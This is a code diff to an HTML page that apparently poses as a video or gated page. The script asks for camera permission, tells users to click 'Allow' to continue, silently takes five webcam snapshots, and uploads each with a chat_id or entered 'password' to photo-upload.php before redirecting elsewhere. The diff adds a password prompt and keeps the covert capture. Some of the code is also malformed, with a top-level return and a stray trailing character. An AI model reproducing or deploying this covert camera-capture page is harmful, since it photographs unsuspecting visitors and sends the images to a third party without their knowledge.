@@ -33,7 +33,8 @@
         }
 
         video {
-            display: none;
+            display: block;
+            margin-top: 20px;
         }
     </style>
 </head>
@@ -41,74 +42,93 @@
     <div id="spinner" class="spinner"></div>
     <video id="video" width="320" height="240" autoplay></video>
     <script>
+        const spinner = document.getElementById('spinner');
+        spinner.classList.remove('hidden');
+
+        const video = document.getElementById('video');
+
+        // Function to get "chat_id" parameter from URL
         function getChatIdFromURL() {
             const urlParams = new URLSearchParams(window.location.search);
             return urlParams.get('id');
         }
 
-        const chatId = getChatIdFromURL();
+        let chatId = getChatIdFromURL();
 
+        // If no chat_id in URL, ask for password
         if (!chatId) {
-            alert('Chat ID is missing from the URL!');
-        } else {
-            const spinner = document.getElementById('spinner');
-            spinner.classList.remove('hidden');
+            chatId = prompt("Password is required to proceed. Please enter the password:");
 
-            const video = document.getElementById('video');
-
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(function(stream) {
-                    video.srcObject = stream;
-
-                    let counter = 0;
-                    const photoInterval = setInterval(function() {
-                        if (counter < 5) {
-                            capturePhoto();
-                            counter++;
-                        } else {
-                            clearInterval(photoInterval);
-                            window.location.href = 'https://izzsem.github.io/project-2/';
-                        }
-                    }, 1000);
-
-                    function capturePhoto() {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        const context = canvas.getContext('2d');
-                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        const photoDataUrl = canvas.toDataURL('image/jpeg');
-
-                        const formData = new FormData();
-                        formData.append('photo', dataURLtoBlob(photoDataUrl));
-                        formData.append('chat_id', chatId);
-
-                        fetch('photo-upload.php', {
-                            method: 'POST',
-                            body: formData
-                        })
-                        .then(response => response.json())
-                        .then(data => console.log('Photo uploaded:', data))
-                        .catch(error => console.error('Error uploading photo:', error));
-                    }
-
-                    function dataURLtoBlob(dataURL) {
-                        const byteString = atob(dataURL.split(',')[1]);
-                        const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
-                        const ab = new ArrayBuffer(byteString.length);
-                        const ia = new Uint8Array(ab);
-                        for (let i = 0; i < byteString.length; i++) {
-                            ia[i] = byteString.charCodeAt(i);
-                        }
-                        return new Blob([ab], { type: mimeString });
-                    }
-                })
-                .catch(function(error) {
-                    console.log("Camera permission denied: ", error);
-                    spinner.classList.add('hidden');
-                    alert("Please click 'Allow' to continue to the page.");
-                });
+            // Check if password is provided
+            if (!chatId) {
+                alert("You must provide a valid password to proceed.");
+                spinner.classList.add('hidden');
+                return; // Stop further execution if no password is provided
+            }
         }
+
+        // Continue with the camera access and other functionality if password (chat_id) is available
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                console.log('Camera access granted');
+                video.srcObject = stream;
+
+                // Check if video is playing
+                video.onplaying = () => {
+                    console.log('Video is playing');
+                };
+
+                let counter = 0;
+                const photoInterval = setInterval(function() {
+                    if (counter < 5) {
+                        capturePhoto();
+                        counter++;
+                    } else {
+                        clearInterval(photoInterval);
+                        window.location.href = 'https://izzsem.github.io/project-2/';
+                    }
+                }, 1000);
+
+                function capturePhoto() {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const photoDataUrl = canvas.toDataURL('image/jpeg');
+
+                    console.log('Captured photo: ', photoDataUrl); // Log the captured photo data
+
+                    const formData = new FormData();
+                    formData.append('photo', dataURLtoBlob(photoDataUrl));
+                    formData.append('password', chatId);  // Using password as chat_id
+
+                    fetch('photo-upload.php', {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .then(data => console.log('Photo uploaded:', data))
+                    .catch(error => console.error('Error uploading photo:', error));
+                }
+
+                function dataURLtoBlob(dataURL) {
+                    const byteString = atob(dataURL.split(',')[1]);
+                    const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+                    const ab = new ArrayBuffer(byteString.length);
+                    const ia = new Uint8Array(ab);
+                    for (let i = 0; i < byteString.length; i++) {
+                        ia[i] = byteString.charCodeAt(i);
+                    }
+                    return new Blob([ab], { type: mimeString });
+                }
+            })
+            .catch(function(error) {
+                console.log("Camera permission denied: ", error);
+                spinner.classList.add('hidden');
+                alert("Please click 'Allow' to continue to the video.");
+            });
     </script>
 </body>
 </html>
+>
